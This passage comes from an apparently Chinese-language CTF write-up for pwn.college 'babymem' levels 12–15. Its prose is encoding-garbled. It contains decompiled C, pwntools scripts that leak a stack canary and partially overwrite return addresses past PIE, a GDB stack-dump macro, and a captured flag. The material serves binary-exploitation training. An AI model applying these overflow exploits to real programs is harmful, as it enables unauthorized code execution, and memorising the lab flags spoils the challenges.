class="hljs-number">0LL</span>);<br>  buf = mmap(<span class="hljs-number">0LL</span>, <span class="hljs-number">0x54</span>uLL, <span class="hljs-number">3</span>, <span class="hljs-number">34</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Payload size: &quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%lu&quot;</span>, nbytes);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Send your payload (up to %lu bytes)!\n&quot;</span>, nbytes[<span class="hljs-number">0</span>]);<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">int</span>)read(<span class="hljs-number">0</span>, buf, nbytes[<span class="hljs-number">0</span>]) &lt; <span class="hljs-number">0</span> )<br>  &#123;<br>    v1 = __errno_location();<br>    v2 = strerror(*v1);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ERROR: Failed to read input -- %s!\n&quot;</span>, v2);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;You said: %s\n&quot;</span>, (<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *)buf);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Goodbye!&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="12-0"><a href="#12-0" class="headerlink" title="12-0"></a>12-0</h1><p>å¼€äº† pieï¼ŒCanary</p><ul><li>ç¨‹åºæœ‰åé—¨ï¼Œå¯ä»¥äºŒæ¬¡è°ƒç”¨ challenge</li><li>å·²çŸ¥ Canary åœ¨ rbp-8 çš„ä½ç½®ï¼Œæˆ‘è®¤ä¸ºå¯ä»¥åˆ©ç”¨å°† buf çš„ç¼“å†²åŒºæº¢å‡ºç›´åˆ° rbp-8ï¼Œç„¶ååˆ©ç”¨ <code>printf(&quot;You said: %s\n&quot;, (const char *)buf);</code>æ¥æ‰“å°å‡º Canaryï¼ŒåŒæ—¶æ„é€ buf ä¸­å«æœ‰REPEATï¼Œä½¿å¾—å¯ä»¥è¿›å…¥ä¸‹ä¸€æ¬¡challenge å‡½æ•°ï¼Œç”±äº Canary æ˜¯ä¸å˜çš„ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥åˆ©ç”¨å‰é¢æ‰“å°å‡ºçš„ Canaryï¼Œä½¿å¾—ç¬¬äºŒæ¬¡æº¢å‡ºå¡«å……æ­£ç¡®çš„ Canary çš„å€¼ï¼Œå¹¶è¦†ç›–è¿”å›åœ°å€</li><li>è°ƒè¯•å‘ç° Canary çš„æœ€é«˜å­—èŠ‚ä¸º 0ï¼Œä¸€èˆ¬ç¡®å®å¦‚æ­¤ã€‚ç”±äº64ä½åœ°å€ä¸­ï¼ŒCanaryæœ€é«˜ä¸€ä¸ªå­—èŠ‚æ˜¯0ï¼Œå› æ­¤éœ€è¦ç”¨ç¼“å†²æœŸè¦†ç›–è¯¥å­—èŠ‚ï¼Œè¿™æ ·<code>printf(&quot;You said: %s\n&quot;, (const char *)buf);</code>æ‰èƒ½é€šè¿‡ printfæ‰“å°å‡º Canary çš„å€¼è€Œä¸ä¼šè¢«æˆªæ–­</li><li>è¯»å–è¾“å‡ºï¼Œéœ€è¦æå–å‡ºè¿™ä¸ªå€¼ï¼Œå¹¶å°†å…¶è½¬åŒ–ä¸º <code>\x00</code>å¼€å¤´çš„å…«å­—èŠ‚</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br> <br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span> :<br>    p = process(<span class="hljs-string">&#x27;/challenge/babymem_level12.0&#x27;</span>)<br>    <br>    <span class="hljs-comment"># first bof , 56 + 1 </span><br>    payload = <span class="hljs-string">b&#x27;REPEAT&#x27;</span> + <span class="hljs-string">b&#x27;A&#x27;</span> * (<span class="hljs-number">56</span> - <span class="hljs-built_in">len</span>(<span class="hljs-string">&#x27;REPEAT&#x27;</span>)) +<span class="hljs-string">b&#x27;B&#x27;</span>  <span class="hljs-comment"># å¡«å……ç¼“å†²åŒºåˆ° 56 å­—èŠ‚</span><br>    p.recvuntil(<span class="hljs-string">&#x27;Payload size:&#x27;</span>)<br>    p.sendline(<span class="hljs-string">b&#x27;57&#x27;</span>)<br>    p.send(payload)<br><br>    <span class="hljs-comment"># ä»ç¨‹åºçš„è¾“å‡ºä¸­è·å– Canary å€¼</span><br>    p.recvuntil(<span class="hljs-string">&#x27;You said: &#x27;</span>)<br>    response = p.recvline()<br>    <span class="hljs-built_in">print</span>(response)<br>    Canary = response[<span class="hljs-number">57</span>:<span class="hljs-number">64</span>]  <span class="hljs-comment"># 7ä¸ªå­—èŠ‚</span><br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Canary value: <span class="hljs-subst">&#123;Canary.<span class="hljs-built_in">hex</span>()&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(Canary)<br>    Canary=<span class="hljs-string">b&#x27;\x00&#x27;</span>+Canary<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Modified Canary value: <span class="hljs-subst">&#123;Canary.<span class="hljs-built_in">hex</span>()&#125;</span>&quot;</span>)<br>    <span class="hljs-comment"># second bof , 56+canary(8)+ 8 +2 =74 </span><br>    <span class="hljs-comment"># recv : You said: REPEATAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABÃ›Ã³&gt;YÃŸpvtVÃ½\x7f</span><br>    <span class="hljs-comment"># Canary =  </span><br>    <br>    payload = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">56</span> + Canary + <span class="hljs-string">b&#x27;B&#x27;</span> * <span class="hljs-number">8</span> + p16(<span class="hljs-number">0x1E74</span>)<br>    <span class="hljs-built_in">print</span>(payload)<br>    p.recvuntil(<span class="hljs-string">&#x27;Payload size:&#x27;</span>)<br>    p.sendline(<span class="hljs-string">b&#x27;74&#x27;</span>)<br>    p.send(payload)<br>   <br>    <span class="hljs-built_in">str</span> = p.recvall(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">str</span>.find(<span class="hljs-string">b&#x27;pwn.college&#123;&#x27;</span>) != -<span class="hljs-number">1</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>)<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-comment">#break </span><br><br><br></code></pre></td></tr></table></figure><h1 id="12-1"><a href="#12-1" class="headerlink" title="12-1"></a>12-1</h1><p>ç•¥</p><h1 id="13-0"><a href="#13-0" class="headerlink" title="13-0"></a>13-0</h1><p>ç•¥</p><h1 id="13-1"><a href="#13-1" class="headerlink" title="13-1"></a>13-1</h1><p>æœ‰ä¸¤ä¸ªå…³é”®çš„å‡½æ•°è°ƒç”¨</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0000217</span><span class="hljs-function">e      <span class="hljs-title">verify_flag</span><span class="hljs-params">()</span></span><br><span class="hljs-function">0000219c      <span class="hljs-title">challenge</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªå‡½æ•°æ‰§è¡Œå®Œåè¿”å›ï¼Œç„¶åè¿›å…¥ challenge å‡½æ•°ï¼Œå®ƒçš„ç¼“å†²åŒºå­˜æœ‰ä¸€éƒ¨åˆ†ä¸Šä¸ªå‡½æ•°æœªæ¸…ç†çš„ä¿¡æ¯ï¼Œä¹Ÿå³æ˜¯ flag</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//**verify_flag å‡½æ•°çš„æ ˆå¸ƒå±€**</span><br><span class="hljs-function"><span class="hljs-keyword">ssize_t</span> <span class="hljs-title">verify_flag</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-keyword">int</span> v0; <span class="hljs-comment">// eax</span><br>  _BYTE v2[<span class="hljs-number">265</span>]; <span class="hljs-comment">// [rsp+37h] [rbp-109h] BYREF</span><br><br>  *(_QWORD *)&amp;v2[<span class="hljs-number">257</span>] = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  v0 = open(<span class="hljs-string">&quot;/flag&quot;</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">return</span> read(v0, v2, <span class="hljs-number">0x100</span>uLL);<br>&#125;<br><span class="hljs-comment">//**challenge å‡½æ•°çš„æ ˆå¸ƒå±€**</span><br><span class="hljs-function">__int64 <span class="hljs-title">challenge</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-keyword">int</span> *v0; <span class="hljs-comment">// rax</span><br>  <span class="hljs-keyword">char</span> *v1; <span class="hljs-comment">// rax</span><br>  <span class="hljs-keyword">size_t</span> nbytes; <span class="hljs-comment">// [rsp+30h] [rbp-1B0h] BYREF</span><br>  <span class="hljs-keyword">void</span> *buf; <span class="hljs-comment">// [rsp+38h] [rbp-1A8h]</span><br>  <span class="hljs-keyword">char</span> v5; <span class="hljs-comment">// [rsp+40h] [rbp-1A0h] BYREF</span><br>  <span class="hljs-keyword">unsigned</span> __int64 v6; <span class="hljs-comment">// [rsp+1D8h] [rbp-8h]</span><br><br>  v6 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  buf = &amp;v5;<br>  <br></code></pre></td></tr></table></figure><p>å‡½æ•°è°ƒç”¨ä¸­ï¼Œæ ˆæŒ‡é’ˆï¼ˆrbpï¼‰åœ¨è°ƒç”¨æœŸé—´ä¸å˜ï¼Œä»è€Œè®¡ç®—å‡º buf å’Œ v2 ä¹‹é—´çš„ç›¸å¯¹åç§»</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><br>offset = (<span class="hljs-built_in">rbp</span> - <span class="hljs-number">0</span>x109<span class="hljs-built_in">h</span>) - (<span class="hljs-built_in">rbp</span> - <span class="hljs-number">0</span>x1A0<span class="hljs-built_in">h</span>)<br><br>Â Â  Â  Â  = <span class="hljs-number">0</span>x1A0<span class="hljs-built_in">h</span> - <span class="hljs-number">0</span>x109<span class="hljs-built_in">h</span><br><br>Â Â  Â  Â  = <span class="hljs-number">0</span>x97<span class="hljs-built_in">h</span><br><br>Â Â  Â  Â  = <span class="hljs-number">151</span> (åè¿›åˆ¶)<br></code></pre></td></tr></table></figure><p>è¦†ç›–å³å¯</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">###</span><br><span class="hljs-comment">### Welcome to /challenge/babymem_level13.1!</span><br><span class="hljs-comment">###</span><br><br><span class="hljs-attribute">Payload</span> size: <span class="hljs-number">151</span><br><span class="hljs-attribute">Send</span> your payload (up to <span class="hljs-number">151</span> bytes)!<br><span class="hljs-attribute">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="hljs-attribute">You</span> said: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaapwn.college&#123;M<span class="hljs-number">2</span>_-CsYNRF<span class="hljs-number">2</span>yXU<span class="hljs-number">04</span>X<span class="hljs-number">4</span>oaNcuL<span class="hljs-number">6</span>ot.<span class="hljs-number">0</span>FNxMDL<span class="hljs-number">1</span>cTMzEzW&#125;<br><br><span class="hljs-attribute">Goodbye</span>!<br><br></code></pre></td></tr></table></figure><h1 id="14-0"><a href="#14-0" class="headerlink" title="14-0"></a>14-0</h1><p> é‡ç‚¹æ˜¯åˆ©ç”¨æœªåˆå§‹åŒ–çš„ç¼“å†²åŒº leak Canaryã€‚ç”±äº<code>printf(&quot;You said: %.454s\n&quot;, (const char *)buf);</code>è¯­å¥é™åˆ¶äº†æ‰“å°å‡ºçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²å¤§å°ï¼Œå› æ­¤æ— æ³•ç›´æ¥æ‰“å°å‡º Canary</p><p>ç¬¬ä¸€æ¬¡æº¢å‡ºï¼Œéœ€è¦æ³„éœ²å‡º Canaryï¼ˆæ³¨æ„é«˜ä½ 0ï¼‰ï¼Œå¹¶ä¸”åŒ…å« repeat ï¼Œä»è€Œè¿›å…¥ç¬¬äºŒæ¬¡challenge è°ƒç”¨</p><p>è·å–Canary æ˜¯éš¾ç‚¹ã€‚å¯ä»¥åŠ¨æ€è°ƒè¯•è·Ÿè¸ªå‡½æ•°æ‰§è¡Œï¼Œä½¿ç”¨ Canary å‘½ä»¤è¾“å‡ºæ ˆä¸­å­˜åœ¨çš„ Canaryã€‚ç¬¬ä¸€æ¬¡è°ƒç”¨ challenge çš„æ—¶å€™ï¼Œä¼šå‘ç°æ ˆä¸­å­˜åœ¨ä¸æ­¢ä¸€ä¸ª Canaryï¼Œè¿™æ˜¯ä¹‹å‰ libc ä¸­å‡½æ•°ï¼ˆæ¯”å¦‚ printfï¼‰ç”¨æ ˆæ—¶æœªæ¸…ç†æ ˆå†…å­˜å¯¼è‡´çš„ Canary æ®‹ç•™ã€‚è°ƒè¯•å¾—åˆ°è¿™äº› Canaryçš„åç§»ï¼Œæ‰¾ä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å¯ä»¥æ‰“å°å‡ºçš„ï¼Œå³å¯æ³„éœ²å‡º Canary</p><p>å¯¹äº pie çš„æ”»å‡»å¯ä»¥å‚ç…§ä¹‹å‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-comment"># å¯åŠ¨è¿›ç¨‹</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span> :<br>    p = process(<span class="hljs-string">&#x27;/challenge/babymem_level14.0&#x27;</span>)<br>    <br>    <span class="hljs-comment"># first bof ,136 + 1 </span><br>    payload = <span class="hljs-string">b&#x27;REPEAT&#x27;</span> + <span class="hljs-string">b&#x27;A&#x27;</span> * (<span class="hljs-number">0xc8</span>-<span class="hljs-number">0x40</span> - <span class="hljs-built_in">len</span>(<span class="hljs-string">&#x27;REPEAT&#x27;</span>)) +<span class="hljs-string">b&#x27;B&#x27;</span>  <br>    p.recvuntil(<span class="hljs-string">&#x27;Payload size:&#x27;</span>)<br>    p.sendline(<span class="hljs-string">b&#x27;137&#x27;</span>) <br>    p.send(payload)<br><br>    <span class="hljs-comment"># ä»ç¨‹åºçš„è¾“å‡ºä¸­è·å– Canary å€¼</span><br>    p.recvuntil(<span class="hljs-string">&#x27;You said: &#x27;</span>)<br>    response = p.recvline()<br>    <span class="hljs-built_in">print</span>(response)<br>    Canary = response[<span class="hljs-number">137</span>:<span class="hljs-number">144</span>]  <span class="hljs-comment"># 7ä¸ªå­—èŠ‚</span><br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Canary value: <span class="hljs-subst">&#123;Canary.<span class="hljs-built_in">hex</span>()&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(Canary)<br>    Canary=<span class="hljs-string">b&#x27;\x00&#x27;</span>+Canary<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Modified Canary value: <span class="hljs-subst">&#123;Canary.<span class="hljs-built_in">hex</span>()&#125;</span>&quot;</span>)<br>    <span class="hljs-comment"># second bof , 136 + canary(8)+ 8 +2 =154</span><br>    <span class="hljs-comment"># recv : You said: REPEATAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABÃ›Ã³&gt;YÃŸpvtVÃ½\x7f</span><br>    <span class="hljs-comment"># Canary =  </span><br>    <br>    payload = <span class="hljs-string">b&#x27;A&#x27;</span> * (<span class="hljs-number">0x1a0</span>-<span class="hljs-number">0x8</span>) + Canary + <span class="hljs-string">b&#x27;B&#x27;</span> * <span class="hljs-number">8</span> + p16(<span class="hljs-number">0x173a</span>)<span class="hljs-comment">#408+8+8+2</span><br>    <span class="hljs-built_in">print</span>(payload)<br>    p.recvuntil(<span class="hljs-string">b&#x27;Payload size:&#x27;</span>)<br>    p.sendline(<span class="hljs-string">b&#x27;426&#x27;</span>)<br>    <span class="hljs-comment">#p.sendlineafter(&#x27;Payload size: &#x27;, str(len(payload)).encode() )</span><br>    p.send(payload)<br><br>    <span class="hljs-built_in">str</span> = p.recvall(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">str</span>.find(<span class="hljs-string">b&#x27;pwn.college&#123;&#x27;</span>) != -<span class="hljs-number">1</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>)<br>        <span class="hljs-keyword">break</span><br><br><br><br><br></code></pre></td></tr></table></figure><h1 id="14-1"><a href="#14-1" class="headerlink" title="14-1"></a>14-1</h1><p>è¿™æ¬¡æ²¡æœ‰ç¨‹åºè‡ªå¸¦çš„æ ˆå†…å®¹çš„æ‰“å°ï¼Œå¯ä»¥dump å‡ºæ ˆä¸Šå†…å­˜ï¼Œæ‰¾å‡ºé‡å¤å‡ºç°çš„ Canary</p><p>æ‰‹æ“è„šæœ¬</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs powershell">define print_rsp_to_rbp<br><br><span class="hljs-built_in">set</span> <span class="hljs-variable">$ptr</span> = <span class="hljs-variable">$rsp</span><br><span class="hljs-keyword">while</span> <span class="hljs-variable">$ptr</span> &lt; <span class="hljs-variable">$rbp</span><br>x/gx <span class="hljs-variable">$ptr</span><br><span class="hljs-built_in">set</span> <span class="hljs-variable">$ptr</span> = <span class="hljs-variable">$ptr</span> + <span class="hljs-number">8</span><br><span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br><br><span class="hljs-comment"># æ¥ä¸‹æ¥ç›´æ¥è°ƒç”¨print_rsp_to_rbpå³å¯</span><br></code></pre></td></tr></table></figure><p>å®šä½åˆ°Canary ä½äº rbp-0x118<br>ç¼“å†²æœŸèµ·å§‹äº rbp-0x1d0</p><p>åç§»1ï¼š0x1d0-0x118</p><p>å…ˆç”¨åç§» 1 è·å–Canary çš„å€¼ï¼Œç¨‹åºè¾“å‡ºyou  saidå­—ç¬¦ä¸²åï¼Œæ¥æ”¶ç¼“å†²åŒºä¸­çš„ Canaryï¼Œå¯¹åº”<code>Canary = response[185:192]</code>  </p><p>æ¥ç€è¿›å…¥ç¬¬äºŒæ¬¡ challenge è°ƒç”¨ï¼Œè·å–åç§» 2ï¼šç¼“å†²åŒº+Canary+rbp+è¿”å›åœ°å€çš„æœ€å 2 å­—èŠ‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-comment"># å¯åŠ¨è¿›ç¨‹</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span> :<br>    p = process(<span class="hljs-string">&#x27;/challenge/babymem_level14.1&#x27;</span>)<br>    <br>    <span class="hljs-comment"># dump stack</span><br>    payload = <span class="hljs-string">b&#x27;REPEAT&#x27;</span> + <span class="hljs-string">b&#x27;A&#x27;</span> * (<span class="hljs-number">184</span> - <span class="hljs-built_in">len</span>(<span class="hljs-string">&#x27;REPEAT&#x27;</span>)) +<span class="hljs-string">b&#x27;B&#x27;</span>  <br>    p.recvuntil(<span class="hljs-string">&#x27;Payload size:&#x27;</span>)<br>    p.sendline(<span class="hljs-string">b&#x27;185&#x27;</span>) <br>    p.send(payload)<br><br>    <span class="hljs-comment"># ä»ç¨‹åºçš„è¾“å‡ºä¸­è·å– Canary å€¼</span><br>    p.recvuntil(<span class="hljs-string">&#x27;You said: &#x27;</span>)<br>    response = p.recvline()<br>    <span class="hljs-built_in">print</span>(response)<br>    Canary = response[<span class="hljs-number">185</span>:<span class="hljs-number">192</span>]  <span class="hljs-comment"># 7ä¸ªå­—èŠ‚</span><br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Canary value: <span class="hljs-subst">&#123;Canary.<span class="hljs-built_in">hex</span>()&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(Canary)<br>    Canary=<span class="hljs-string">b&#x27;\x00&#x27;</span>+Canary<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Modified Canary value: <span class="hljs-subst">&#123;Canary.<span class="hljs-built_in">hex</span>()&#125;</span>&quot;</span>)<br>    <br>    payload = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">456</span> + Canary + <span class="hljs-string">b&#x27;B&#x27;</span> * <span class="hljs-number">8</span> + p16(<span class="hljs-number">0x17F5</span>)<br>    <span class="hljs-built_in">print</span>(payload)<br>    p.recvuntil(<span class="hljs-string">&#x27;Payload size:&#x27;</span>)<br>    p.sendline(<span class="hljs-string">b&#x27;474&#x27;</span>)<br>    p.send(payload)<br>   <br>    <span class="hljs-built_in">str</span> = p.recvall(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">str</span>.find(<span class="hljs-string">b&#x27;pwn.college&#123;&#x27;</span>) != -<span class="hljs-number">1</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>)<br>        <span class="hljs-keyword">break</span><br><br><br></code></pre></td></tr></table></figure><h1 id="15-0"><a href="#15-0" class="headerlink" title="15-0"></a>15-0</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span 